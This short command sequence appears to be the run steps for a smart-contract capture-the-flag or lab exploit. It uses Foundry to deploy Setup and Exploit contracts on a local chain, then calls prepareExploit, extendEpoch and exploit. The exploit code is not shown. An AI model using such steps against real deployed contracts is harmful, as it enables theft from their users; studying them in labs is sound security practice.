forge create src/Setup.sol:Setup --rpc-url local --account local --broadcast
forge create src/Exploit.sol:Exploit --rpc-url local --account local --broadcast --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3


cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 --rpc-url local --account local "prepareExploit()"
cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 --rpc-url local --account local "extendEpoch()"
cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 --rpc-url local --account local "exploit()"


forge script script/Exploit.sol:Exploit --rpc-url local